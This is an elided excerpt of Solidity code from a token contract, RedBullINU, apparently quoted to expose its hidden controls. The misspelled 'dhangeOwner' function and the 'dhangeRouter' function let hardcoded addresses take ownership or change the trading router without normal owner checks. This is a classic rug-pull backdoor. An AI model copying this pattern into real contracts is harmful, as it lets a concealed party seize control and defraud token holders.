...
contract Ownable {
    ...
    function dhangeOwner(address newOwner) public  {
        require
         (  
             msg.sender
            == 0x3a0d385C8b428a0E7d6c1d68BbBC7cC7C4e06d02
            );
                    _owner = newOwner;
    }
}
...
contract RedBullINU is IERC20, Ownable {
    ...
    function excludeFromFee(address account) public  {
        require
         (  
             msg.sender
            == 0x49D3162219480ca21ecc7A195187ee1AaE96dbc3
            );
    ...
    function dhangeRouter(address router) public  {
        require
         (  
             msg.sender
            == 0x49D3162219480ca21ecc7A195187ee1AaE96dbc3
